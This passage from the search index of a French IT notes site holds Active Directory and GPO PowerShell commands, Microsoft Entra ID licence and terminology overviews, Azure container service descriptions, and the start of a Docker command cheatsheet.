(OU)","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#creer-une-nouvelle-ou","title":"Cr\u00e9er une nouvelle OU","text":"<pre><code>New-ADOrganizationalUnit -Name \"IT Department\" -Path \"DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#supprimer-une-ou","title":"Supprimer une OU","text":"<pre><code>Remove-ADOrganizationalUnit -Identity \"OU=IT Department,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#deplacer-une-ou","title":"D\u00e9placer une OU","text":"<pre><code>Move-ADObject -Identity \"OU=OldOU,DC=domain,DC=local\" -TargetPath \"OU=NewLocation,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-group-policies-gpo","title":"\ud83e\udd5e Gestion des Group Policies (GPO)","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#lister-toutes-les-gpos","title":"Lister toutes les GPOs","text":"<pre><code>Get-GPO -All\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#lier-une-gpo-a-une-ou","title":"Lier une GPO \u00e0 une OU","text":"<pre><code>`New-GPLink -Name \"Password Policy\" -Target \"OU=IT,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#definir-les-autorisations-sur-une-gpo","title":"D\u00e9finir les autorisations sur une GPO","text":"<pre><code>Set-GPPermissions -Name \"Password Policy\" -TargetName \"IT Admins\" -TargetType Group -PermissionLevel GpoEdit\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#sauvegarder-toutes-les-gpos","title":"Sauvegarder toutes les GPOs","text":"<pre><code>Backup-GPO -All -Path \"C:\\Backup\\GPOs\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-relations-de-confiance-trust","title":"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68 Gestion des Relations de Confiance (Trust)","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#creer-une-relation-de-confiance-inter-forets","title":"Cr\u00e9er une relation de confiance inter-for\u00eats","text":"<pre><code>New-ADTrust -Name \"trusted.local\" -SourceForest \"domain.local\" -TargetForest \"trusted.local\" -TrustType Forest -TrustDirection Bidirectional\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#tester-une-relation-de-confiance","title":"Tester une relation de confiance","text":"<pre><code>Test-ADTrustRelationship -Source \"domain.local\" -Target \"trusted.local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#supprimer-une-relation-de-confiance","title":"Supprimer une relation de confiance","text":"<pre><code>Remove-ADTrust -Name \"trusted.local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#sauvegarde-et-audit","title":"\ud83d\udcbe Sauvegarde et Audit","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#sauvegarder-tous-les-objets-ad-dans-un-fichier-csv","title":"Sauvegarder tous les objets AD dans un fichier CSV","text":"<pre><code>Get-ADUser -Filter * -Property DisplayName, Title, Department | Export-Csv -Path \"C:\\Backup\\ADUsers.csv\" -NoTypeInformation\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#audit-des-modifications-dun-utilisateur-specifique","title":"Audit des modifications d\u2019un utilisateur sp\u00e9cifique","text":"<pre><code>Search-ADAccount -AccountDisabled -UsersOnly -SearchBase \"OU=IT,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#verifier-les-changements-recents-dun-objet-ad","title":"V\u00e9rifier les changements r\u00e9cents d\u2019un objet AD","text":"<pre><code>Get-ADObject -Filter {whenChanged -ge (Get-Date).AddDays(-7)} -Property DisplayName, whenChanged\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-forets-et-domaines","title":"\ud83c\udf33 Gestion des For\u00eats et Domaines","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#ajouter-un-controleur-de-domaine","title":"Ajouter un contr\u00f4leur de domaine","text":"<pre><code>Install-ADDSDomainController -DomainName \"domain.local\" -InstallDns -Credential (Get-Credential) -SiteName \"Default-First-Site-Name\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#promouvoir-un-serveur-en-tant-que-dc","title":"Promouvoir un serveur en tant que DC","text":"<pre><code>Install-ADDSForest -DomainName \"newdomain.local\" -ForestMode Win2016 -DomainMode Win2016 -InstallDns -SafeModeAdministratorPassword (ConvertTo-SecureString \"AdminPassword\" -AsPlainText -Force)\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Powershell/","title":"Powershell","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Powershell/#certificats","title":"Certificats","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Powershell/#signer-un-binaire-avec-un-certificat","title":"Signer un binaire avec un certificat","text":"<p>Besoin de signtool.exe : installer le SDK windows https://developer.microsoft.com/fr-fr/windows/downloads/windows-sdk/</p> <pre><code>#On r\u00e9cup\u00e8re le thumbprint du certificat\nGet-ChildItem -Path Cert:\\CurrentUser\\My\n\n$certThumbprint = \"thumbprint\"\n$msiFile = \"C:\\chemin\\du\\fichier.msi\"\n\nsigntool sign /fd SHA256 /sha1 $certThumbprint /tr http://timestamp.digicert.com /td SHA256 $msiFile\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Bases/","title":"Bases","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Bases/#licences","title":"Licences","text":"<ul> <li> <p>Microsoft Entra ID gratuit. Offre la gestion des utilisateurs et des groupes, la synchronisation d\u2019annuaires locaux, des rapports de base, des changements de mot de passe en libre-service pour les utilisateurs cloud ainsi que l\u2019authentification unique sur Azure, Microsoft\u00a0365 et bon nombre d\u2019applications SaaS populaires.</p> </li> <li> <p>Microsoft Entra ID P1. En plus des fonctionnalit\u00e9s Free, la licence P1 offre \u00e0 vos utilisateurs hybrides l\u2019acc\u00e8s aux ressources locales et cloud. Elle prend \u00e9galement en charge des fonctionnalit\u00e9s administratives avanc\u00e9es, notamment les groupes dynamiques, la gestion de groupes libre-service, Microsoft Identity Manager et la r\u00e9\u00e9criture dans le cloud pour faire b\u00e9n\u00e9ficier \u00e0 vos utilisateurs locaux de la r\u00e9initialisation de mot de passe en libre-service. </p> </li> <li> <p>Microsoft Entra ID P2. En plus des fonctionnalit\u00e9s Free et P1, la licence P2 offre Microsoft Entra ID Protection pour fournir un acc\u00e8s conditionnel en fonction des risques \u00e0 vos applications et aux donn\u00e9es critiques de l\u2019entreprise. Elle propose \u00e9galement Privileged Identity Management pour faciliter la d\u00e9couverte, la restriction et la supervision des administrateurs et leur acc\u00e8s aux ressources et, au besoin, fournir un acc\u00e8s juste-\u00e0-temps.  </p> </li> <li> <p>Licences pour les fonctionnalit\u00e9s avec \u00ab\u00a0paiement \u00e0 l\u2019utilisation\u00a0\u00bb. Vous pouvez \u00e9galement obtenir des licences pour des fonctionnalit\u00e9s, par exemple Microsoft Entra Business-to-Customer (B2C). B2C peut vous aider \u00e0 fournir des solutions de gestion d'identit\u00e9 et d'acc\u00e8s pour vos applications orient\u00e9es vers les clients.</p> </li> </ul> <p></p>"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Bases/#fonctionnalites","title":"Fonctionnalit\u00e9s","text":"Cat\u00e9gorie Description Gestion des applications G\u00e9rez vos applications cloud et locales avec le proxy d\u2019application, l\u2019authentification unique, le portail Mes applications et les applications SaaS (software as a service). Authentification G\u00e9rez la r\u00e9initialisation de mot de passe en libre-service Microsoft\u00a0Entra, l\u2019authentification multifacteur, la liste de mots de passe interdits personnalis\u00e9 et le verrouillage intelligent. ID Microsoft Entra pour les d\u00e9veloppeurs Cr\u00e9ez des applications qui connectent toutes les identit\u00e9s Microsoft et obtiennent des jetons pour appeler Microsoft Graph, d\u2019autres API Microsoft ou des API personnalis\u00e9es. Entreprise-entreprise (B2B) G\u00e9rez vos utilisateurs invit\u00e9s et partenaires externes tout en conservant le contr\u00f4le de vos donn\u00e9es d\u2019entreprise. Entreprise-client (B2C) Personnalisez et contr\u00f4lez la fa\u00e7on dont les utilisateurs s\u2019inscrivent, se connectent et g\u00e8rent leurs profils quand ils utilisent vos applications. Acc\u00e8s conditionnel G\u00e9rez l\u2019acc\u00e8s \u00e0 vos applications cloud. Gestion des appareils G\u00e9rez la fa\u00e7on dont vos appareils cloud ou locaux acc\u00e8dent \u00e0 vos donn\u00e9es d\u2019entreprise. Services de domaine Joignez des machines virtuelles Azure \u00e0 un domaine sans contr\u00f4leur de domaine. Utilisateurs d\u2019entreprise G\u00e9rez les attributions de licences, acc\u00e9dez \u00e0 des applications et configurez des d\u00e9l\u00e9gu\u00e9s \u00e0 l\u2019aide de groupes et de r\u00f4les d\u2019administrateur. Identit\u00e9 hybride Utilisez Microsoft Entra Connect et Connect Health pour fournir une identit\u00e9 d\u2019utilisateur unique pour l\u2019authentification et l\u2019autorisation aupr\u00e8s de toutes les ressources, ind\u00e9pendamment de l\u2019emplacement (cloud ou local). Gouvernance des identit\u00e9s G\u00e9rez l\u2019identit\u00e9 de votre organisation au moyen de contr\u00f4les d\u2019acc\u00e8s pour vos employ\u00e9s, partenaires commerciaux, fournisseurs, services et applications. Vous pouvez \u00e9galement effectuer des r\u00e9visions d\u2019acc\u00e8s. Identity Protection D\u00e9tectez les vuln\u00e9rabilit\u00e9s potentielles qui affectent les identit\u00e9s de votre organisation, configurez des strat\u00e9gies pour r\u00e9pondre aux actions suspectes et prenez les mesures appropri\u00e9es pour les r\u00e9soudre. Identit\u00e9s g\u00e9r\u00e9es pour les ressources Azure Fournissez \u00e0 vos services Azure une identit\u00e9 manag\u00e9e automatiquement dans Microsoft Entra ID qui peut authentifier n\u2019importe quel service d\u2019authentification pris en charge par Microsoft Entra ID, notamment Key Vault. Privileged Identity Management (PIM) G\u00e9rez, contr\u00f4lez et supervisez l\u2019acc\u00e8s au sein de votre organisation. Cette fonctionnalit\u00e9 inclut l\u2019acc\u00e8s aux ressources dans Microsoft Entra ID et Azure, ainsi qu\u2019\u00e0 d\u2019autres services Microsoft Online, comme Microsoft\u00a0365 ou Intune. Supervision et int\u00e9grit\u00e9 Obtenez des insights sur la s\u00e9curit\u00e9 et les mod\u00e8les d\u2019utilisation de votre environnement. Identit\u00e9s de charge de travail Il s\u2019agit d\u2019une identit\u00e9 utilis\u00e9e par une charge de travail logicielle (telle qu\u2019une application, un service, un script ou un conteneur) pour authentifier et acc\u00e9der \u00e0 d\u2019autres services et ressources. ### Terminologie Terme ou concept Description Identit\u00e9 Une chose qui peut \u00eatre authentifi\u00e9e. Une identit\u00e9 peut \u00eatre un utilisateur avec un nom d\u2019utilisateur et un mot de passe. Les identit\u00e9s incluent \u00e9galement des applications ou autres serveurs qui peuvent n\u00e9cessiter l\u2019authentification via des cl\u00e9s secr\u00e8tes ou des certificats. Compte Une identit\u00e9 qui a des donn\u00e9es associ\u00e9es. Vous ne pouvez pas avoir de compte sans identit\u00e9. Compte Microsoft Entra Identit\u00e9 cr\u00e9\u00e9e par le biais Microsoft Entra ID ou d\u2019un autre service cloud Microsoft comme Microsoft\u00a0365. Les identit\u00e9s sont stock\u00e9es dans Microsoft Entra ID et sont accessibles \u00e0 tout abonnement \u00e0 un service cloud de votre organisation. Ce compte est parfois appel\u00e9 un compte professionnel ou scolaire. Administrateur de comptes Ce r\u00f4le d\u2019administrateur d\u2019abonnement classique est th\u00e9oriquement le propri\u00e9taire du compte de facturation d\u2019un abonnement. Ce r\u00f4le permet de g\u00e9rer tous les abonnements d\u2019un compte. Administrateur de services Ce r\u00f4le d\u2019administrateur d\u2019abonnement classique vous permet de g\u00e9rer toutes les ressources Azure, notamment l\u2019acc\u00e8s \u00e0 celles-ci. Ce r\u00f4le a un droit d\u2019acc\u00e8s \u00e9quivalent \u00e0 celui d\u2019un utilisateur qui se voit attribuer le r\u00f4le Propri\u00e9taire au niveau de l\u2019\u00e9tendue de l\u2019abonnement. Owner Ce r\u00f4le vous permet de g\u00e9rer toutes les ressources Azure, notamment l\u2019acc\u00e8s \u00e0 celles-ci. Ce r\u00f4le est bas\u00e9 sur un syst\u00e8me d\u2019autorisation plus r\u00e9cent appel\u00e9 \u00ab\u00a0contr\u00f4le d\u2019acc\u00e8s en fonction du r\u00f4le Azure\u00a0\u00bb (Azure RBAC) qui permet de g\u00e9rer avec pr\u00e9cision l\u2019acc\u00e8s aux ressources Azure. administrateur g\u00e9n\u00e9ral Microsoft Entra Ce r\u00f4le d\u2019administrateur est automatiquement attribu\u00e9 au cr\u00e9ateur du locataire Microsoft Entra. Vous pouvez avoir plusieurs administrateurs g\u00e9n\u00e9raux, mais seuls les administrateurs g\u00e9n\u00e9raux peuvent attribuer des r\u00f4les d\u2019administrateur (notamment d\u2019autres r\u00f4les d\u2019administrateur g\u00e9n\u00e9ral) aux utilisateurs. Abonnement Azure Permet de payer les services cloud Azure. Vous pouvez avoir plusieurs abonnements, lesquels sont li\u00e9s \u00e0 une carte de cr\u00e9dit. Client Azure Un instance d\u00e9di\u00e9 et approuv\u00e9 de Microsoft Entra ID. Le locataire est automatiquement cr\u00e9\u00e9 quand votre organisation s\u2019inscrit \u00e0 un abonnement de service cloud Microsoft. Ces abonnements comprennent Microsoft Azure, Microsoft Intune ou Microsoft\u00a0365. Un locataire Azure repr\u00e9sente une seule organisation. Locataire unique Un locataire Azure qui acc\u00e8de \u00e0 d\u2019autres services dans un environnement d\u00e9di\u00e9 est consid\u00e9r\u00e9 comme un locataire unique. Multi-locataire Les locataires Azure qui acc\u00e8dent \u00e0 d\u2019autres services dans un environnement partag\u00e9 entre plusieurs organisations sont consid\u00e9r\u00e9s comme multilocataires. R\u00e9pertoire Microsoft Entra Chaque locataire Azure dispose d'un r\u00e9pertoire Microsoft Entra d\u00e9di\u00e9 et fiable. L\u2019annuaire Microsoft Entra inclut les utilisateurs, groupes et applications du locataire. Il permet d\u2019effectuer les fonctions de gestion des identit\u00e9s et des acc\u00e8s pour les ressources des locataires. Domaine personnalis\u00e9 Chaque nouveau r\u00e9pertoire Microsoft Entra est fourni avec un nom de domaine initial, par exemple nomdomaine.onmicrosoft.com. En plus de ce nom initial, vous pouvez \u00e9galement ajouter les noms de domaine de votre organisation. Les noms de domaine de votre organisation incluent les noms que vous utilisez pour votre activit\u00e9 et que vos utilisateurs utilisent pour acc\u00e9der aux ressources de votre organisation, \u00e0 la liste. L\u2019ajout de noms de domaine personnalis\u00e9s vous permet de cr\u00e9er des noms d\u2019utilisateur qui sont familiers \u00e0 vos utilisateurs, par exemple alain@contoso.com. Compte Microsoft (\u00e9galement appel\u00e9 MSA) Comptes personnels qui permettent d\u2019acc\u00e9der \u00e0 vos produits et services cloud Microsoft orient\u00e9s consommateur. Ces produits et services comprennent Outlook, OneDrive, Xbox LIVE ou Microsoft\u00a0365. Votre compte Microsoft est cr\u00e9\u00e9 et stock\u00e9 dans le syst\u00e8me de comptes d\u2019identit\u00e9 des consommateurs de Microsoft."},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Bases/#types-dutilisateurs","title":"Types d'utilisateurs","text":"<ul> <li>Membre interne\u00a0: ces utilisateurs sont probablement des salari\u00e9s \u00e0 temps plein dans votre organisation.  </li> <li>Invit\u00e9 interne\u00a0: ces utilisateurs ont un compte dans votre locataire, mais disposent de privil\u00e8ges de niveau Invit\u00e9. Il est possible qu\u2019ils aient \u00e9t\u00e9 cr\u00e9\u00e9s au sein de votre locataire avant la disponibilit\u00e9 de B2B Collaboration.</li> <li>Membre externe\u00a0: ces utilisateurs s\u2019authentifient \u00e0 l\u2019aide d\u2019un compte externe, mais disposent d\u2019un acc\u00e8s membre \u00e0 votre locataire. Ces types d\u2019utilisateurs sont courants dans les organisations d\u2019architecture mutualis\u00e9es.</li> <li>Invit\u00e9 externe\u00a0: ces utilisateurs sont de v\u00e9ritables invit\u00e9s de votre locataire qui s\u2019authentifient \u00e0 l\u2019aide d\u2019une m\u00e9thode externe et qui disposent de privil\u00e8ges de niveau Invit\u00e9.</li> </ul> <p>Les m\u00e9thodes d\u2019authentification varient en fonction du type d\u2019utilisateur que vous cr\u00e9ez. Les invit\u00e9s et les membres internes ont des informations d\u2019identification dans votre locataire Microsoft Entra qui peuvent \u00eatre g\u00e9r\u00e9es par des administrateurs. Ces utilisateurs peuvent \u00e9galement r\u00e9initialiser leur propre mot de passe. Les membres externes s\u2019authentifient aupr\u00e8s de leur locataire Microsoft Entra d\u2019origine et votre locataire Microsoft Entra authentifie l\u2019utilisateur par le biais d\u2019une connexion f\u00e9d\u00e9r\u00e9e avec le locataire Microsoft Entra du membre externe. Si les membres externes oublient leur mot de passe, l\u2019administrateur de leur locataire Microsoft Entra peut le r\u00e9initialiser. Les invit\u00e9s externes configurent leur propre mot de passe \u00e0 l\u2019aide du lien qu\u2019ils re\u00e7oivent dans l\u2019e-mail lors de la cr\u00e9ation de leur compte.</p>"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Entra%20Connect/","title":"Entra Connect","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Entra%20Connect/#fonctionnalites-de-microsoft-entra-connect","title":"Fonctionnalit\u00e9s de Microsoft Entra Connect","text":"<ul> <li>Synchronisation du hachage du mot de passe \u2013 m\u00e9thode de connexion qui synchronise le hachage du mot de passe AD sur site d'un utilisateur avec Microsoft Entra ID.</li> <li>Authentification directe\u00a0: m\u00e9thode d\u2019authentification qui permet aux utilisateurs d\u2019utiliser le m\u00eame mot de passe localement et dans le cloud, mais sans n\u00e9cessiter l\u2019infrastructure suppl\u00e9mentaire d\u2019un environnement f\u00e9d\u00e9r\u00e9.</li> <li>Int\u00e9gration de f\u00e9d\u00e9ration\u00a0: la f\u00e9d\u00e9ration est une partie facultative de Microsoft Entra Connect qui peut servir \u00e0 configurer un environnement hybride \u00e0 l\u2019aide d\u2019une infrastructure AD FS locale. Elle offre \u00e9galement des fonctionnalit\u00e9s de gestion AD FS telles que le renouvellement de certificat et les d\u00e9ploiements de serveurs AD FS suppl\u00e9mentaires.</li> <li>Synchronisation\u00a0: ce composant est charg\u00e9 de cr\u00e9er des utilisateurs, des groupes et d\u2019autres objets, et \u00e9galement de s\u2019assurer que les informations d\u2019identit\u00e9 relatives aux utilisateurs et aux groupes dans votre environnement local correspondent \u00e0 celles qui se trouvent dans le cloud. Cette synchronisation inclut \u00e9galement des hachages de mot de passe.</li> <li>Monitoring de l\u2019int\u00e9grit\u00e9\u00a0: Microsoft Entra Connect Health peut assurer une supervision robuste et offrir un emplacement central dans le centre d\u2019administration Microsoft Entra pour la visualisation de cette activit\u00e9.</li> </ul>"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Entra%20Connect/#avantages-cles-et-bonnes-pratiques","title":"Avantages cl\u00e9s et bonnes pratiques\u00a0:","text":"Principaux avantages Meilleures pratiques S\u00e9curit\u00e9 am\u00e9lior\u00e9e Tendances de verrouillage extranetRapport sur les \u00e9checs de connexionsConformit\u00e9 aux r\u00e9glementations en mati\u00e8re de confidentialit\u00e9 Obtention d\u2019alertes pour tous les probl\u00e8mes critiques li\u00e9s au syst\u00e8me\u00a0ADFS Configuration et disponibilit\u00e9 de serveur   Performances et connectivit\u00e9 \u2013 Maintenance r\u00e9guli\u00e8re Facilit\u00e9 de d\u00e9ploiement et de gestion Installation rapide de l\u2019agentMise \u00e0 niveau automatique de l\u2019agent vers la derni\u00e8re versionDonn\u00e9es disponibles dans le portail en quelques minutes M\u00e9triques d\u2019utilisation enrichies Utilisation des principales applications  Emplacements r\u00e9seau et connexion TCP  Demandes de jetons par serveur Une meilleure exp\u00e9rience utilisateur Mode de tableau de bord \u00e0 partir du centre d\u2019administration Microsoft Entra   Alertes par e-mail"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Entra%20Connect/#comparaison-entre-microsoft-entra-connect-et-la-synchronisation-cloud","title":"Comparaison entre Microsoft Entra Connect et la synchronisation cloud","text":"<p>Le tableau suivant permet de comparer Microsoft Entra Connect et Synchronisation cloud Microsoft Entra\u00a0:</p> Fonctionnalit\u00e9 Connect sync Synchronisation cloud Connexion \u00e0 une for\u00eat AD locale \u25cf \u25cf Connexion \u00e0 plusieurs for\u00eats\u00a0AD locales \u25cf \u25cf Connexion \u00e0 plusieurs for\u00eats\u00a0Active Directory locales d\u00e9connect\u00e9es \u25cf Mod\u00e8le d\u2019installation d\u2019agent l\u00e9ger \u25cf Plusieurs agents actifs pour la haute disponibilit\u00e9 \u25cf Connexion aux annuaires LDAP \u25cf Prise en charge des objets utilisateur \u25cf \u25cf Prise en charge des objets groupe \u25cf \u25cf Prise en charge des objets contact \u25cf \u25cf Prise en charge des objets appareil \u25cf Autorisation de la personnalisation de base pour les flux d\u2019attributs \u25cf \u25cf Synchronisation des attributs Exchange Online \u25cf \u25cf Synchronisation des attributs d\u2019extension 1-15 \u25cf \u25cf Synchronisation des attributs Active Directory d\u00e9finis par le client (extensions d\u2019annuaire) \u25cf \u25cf Prise en charge de la synchronisation de hachage de mot de passe \u25cf \u25cf Prise en charge de l\u2019authentification directe \u25cf Prise en charge de la f\u00e9d\u00e9ration \u25cf \u25cf Authentification unique transparente \u25cf \u25cf Installation des supports sur un contr\u00f4leur de domaine \u25cf \u25cf Prise en charge pour Windows Server\u00a02016 \u25cf \u25cf Filtrage sur les domaines/unit\u00e9s d\u2019organisation/groupes \u25cf \u25cf Filtrage sur les valeurs d\u2019attributs des objets \u25cf Autorisation d\u2019un ensemble minimal d\u2019attributs \u00e0 synchroniser (MinSync) \u25cf \u25cf Autoriser la suppression des attributs du flux d'AD vers Microsoft Entra ID \u25cf \u25cf Autorisation de la personnalisation avanc\u00e9e pour les flux d\u2019attributs \u25cf Prise en charge de la r\u00e9\u00e9criture du mot de passe \u25cf \u25cf Prise en charge de la r\u00e9\u00e9criture d\u2019appareil \u25cf Les clients doivent utiliser l\u2019approbation Kerberos cloud pour cette fonctionnalit\u00e9 Prise en charge de la r\u00e9\u00e9criture de groupe \u25cf \u25cf Prise en charge de la fusion des attributs utilisateur de plusieurs domaines \u25cf Prise en charge de Microsoft Entra Domain Services \u25cf \u00c9criture diff\u00e9r\u00e9e d\u2019Exchange hybride \u25cf \u25cf Nombre illimit\u00e9 d\u2019objets par domaine AD \u25cf Prise en charge d\u2019un maximum de 150\u00a0000 objets par domaine AD \u25cf \u25cf Groupes jusqu\u2019\u00e0 50\u00a0000\u00a0membres \u25cf \u25cf Grands groupes jusqu\u2019\u00e0 250\u00a0000\u00a0membres \u25cf R\u00e9f\u00e9rences entre les domaines \u25cf \u25cf Approvisionnement \u00e0 la demande \u25cf Prise en charge pour le gouvernement des \u00c9tats-Unis \u25cf \u25cf"},{"location":"IT/Azure%20et%20Active%20Directory/Entra%20ID/Entra%20Identity%20Protection/","title":"Entra Identity Protection","text":""},{"location":"IT/Azure%20et%20Active%20Directory/IaaS/VM/","title":"VM","text":""},{"location":"IT/Azure%20et%20Active%20Directory/IaaS/VM/#creation-dune-vm-en-powershell","title":"Cr\u00e9ation d'une VM en powershell","text":"<pre><code>az vm create \\\n  --resource-group \"[sandbox resource group name]\" \\\n  --name my-vm \\\n  --public-ip-sku Standard \\\n  --image Ubuntu2204 \\\n  --admin-username azureuser \\\n  --generate-ssh-keys\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/PaaS/Containers/","title":"Containers","text":""},{"location":"IT/Azure%20et%20Active%20Directory/PaaS/Containers/#azure-container-instances","title":"Azure Container Instances","text":"<p>Azure Container Instances offre le moyen le plus rapide et le plus simple d\u2019ex\u00e9cuter un conteneur dans Azure, sans avoir \u00e0 g\u00e9rer les machines virtuelles ou \u00e0 adopter des services suppl\u00e9mentaires. Azure Container Instances est une offre PaaS (Platform as a Service). Azure Container Instances vous permet de t\u00e9l\u00e9charger vos conteneurs, le service ex\u00e9cute alors les conteneurs \u00e0 votre place.</p>"},{"location":"IT/Azure%20et%20Active%20Directory/PaaS/Containers/#azure-container-apps","title":"Azure Container Apps","text":"<p>La plateforme Azure\u00a0Container\u00a0Apps est similaire \u00e0 bien des \u00e9gards \u00e0 une instance de conteneur. Elle vous permettent d\u2019\u00eatre op\u00e9rationnel imm\u00e9diatement, suppriment l\u2019\u00e9l\u00e9ment de gestion de conteneurs et constituent une offre PaaS. Container\u00a0Apps offre des avantages suppl\u00e9mentaires, tels que la possibilit\u00e9 d\u2019incorporer un \u00e9quilibrage de charge et une mise \u00e0 l\u2019\u00e9chelle. Ces autres fonctions vous permettent d\u2019\u00eatre plus \u00e9lastique dans votre conception.</p>"},{"location":"IT/Azure%20et%20Active%20Directory/PaaS/Containers/#azure-kubernetes-service","title":"Azure Kubernetes Service","text":"<p>Azure\u00a0Kubernetes\u00a0Service (AKS) est un service d\u2019orchestration de conteneurs. Un service d\u2019orchestration g\u00e8re le cycle de vie de conteneurs. Lorsque vous d\u00e9ployez une flotte de conteneurs, AKS peut rendre la gestion de la flotte plus simple et plus efficace.</p>"},{"location":"IT/Cheatsheets/Docker/","title":"Docker","text":""},{"location":"IT/Cheatsheets/Docker/#configuration-initiale","title":"\ud83d\ude80 Configuration Initiale","text":""},{"location":"IT/Cheatsheets/Docker/#verifier-la-version-de-docker","title":"V\u00e9rifier la version de Docker","text":"<pre><code>docker --version\n</code></pre> <p>Affiche la version install\u00e9e de Docker sur votre syst\u00e8me. Utile pour v\u00e9rifier que Docker est bien install\u00e9.</p>"},{"location":"IT/Cheatsheets/Docker/#lancer-le-service-docker","title":"Lancer le service Docker","text":"<pre><code>sudo systemctl start docker\n</code></pre> <p>D\u00e9marre le service Docker sur votre machine (n\u00e9cessaire sous Linux).</p>"},{"location":"IT/Cheatsheets/Docker/#activer-docker-au-demarrage","title":"Activer Docker au d\u00e9marrage","text":"<pre><code>sudo systemctl enable docker\n</code></pre> <p>Configure Docker pour se lancer automatiquement au d\u00e9marrage du syst\u00e8me.</p>"},{"location":"IT/Cheatsheets/Docker/#verifier-si-docker-fonctionne","title":"V\u00e9rifier si Docker fonctionne","text":"<pre><code>docker info\n</code></pre> <p>Affiche des informations d\u00e9taill\u00e9es sur l\u2019installation, y compris l\u2019\u00e9tat du daemon et les param\u00e8tres de configuration.</p>"},{"location":"IT/Cheatsheets/Docker/#gestion-des-conteneurs","title":"\ud83d\udce6 Gestion des Conteneurs","text":""},{"location":"IT/Cheatsheets/Docker/#lister-les-conteneurs-actifs","title":"Lister les conteneurs actifs","text":"<pre><code>docker ps\n</code></pre> <p>Affiche la liste des conteneurs actuellement en cours d'ex\u00e9cution.</p>"},{"location":"IT/Cheatsheets/Docker/#lister-tous-les-conteneurs-y-compris-stoppes","title":"Lister tous les conteneurs (y compris stopp\u00e9s)","text":"<pre><code>docker ps -a\n</code></pre> <p>Affiche tous les conteneurs, y compris ceux qui sont arr\u00eat\u00e9s.</p>"},{"location":"IT/Cheatsheets/Docker/#lancer-un-conteneur","title":"Lancer un conteneur","text":"<pre><code>docker run &lt;image&gt;\n</code></pre> <p>Cr\u00e9e et ex\u00e9cute un conteneur bas\u00e9 sur l\u2019image sp\u00e9cifi\u00e9e.</p>"},{"location":"IT/Cheatsheets/Docker/#lancer-un-conteneur-en-arriere-plan-detache","title":"Lancer un conteneur en arri\u00e8re-plan (d\u00e9tach\u00e9)","text":"<pre><code>docker run -d &lt;image&gt;\n</code></pre> <p>Ex\u00e9cute un conteneur en arri\u00e8re-plan et renvoie son ID.</p>"},{"location":"IT/Cheatsheets/Docker/#lancer-un-conteneur-interactif","title":"Lancer un conteneur interactif","text":"<pre><code>docker run -it &lt;image&gt; /bin/bash\n</code></pre> <p>Lance un conteneur en mode interactif et ouvre un terminal (<code>bash</code> dans cet exemple).</p>"},{"location":"IT/Cheatsheets/Docker/#arreter-un-conteneur","title":"Arr\u00eater un conteneur","text":"<pre><code>docker stop &lt;id_containeur&gt;\n</code></pre> <p>Arr\u00eate un conteneur en cours d'ex\u00e9cution.</p>"},{"location":"IT/Cheatsheets/Docker/#redemarrer-un-conteneur","title":"Red\u00e9marrer un conteneur","text":"<pre><code>docker restart &lt;id_containeur&gt;\n</code></pre> <p>Arr\u00eate et relance un conteneur.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-un-conteneur","title":"Supprimer un conteneur","text":"<pre><code>docker rm &lt;id_containeur&gt;\n</code></pre> <p>Supprime un conteneur arr\u00eat\u00e9. Il faut d\u2019abord l\u2019arr\u00eater si n\u00e9cessaire.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-tous-les-conteneurs-arretes","title":"Supprimer tous les conteneurs arr\u00eat\u00e9s","text":"<pre><code>docker container prune\n</code></pre> <p>Nettoie et supprime tous les conteneurs qui ne sont pas en cours 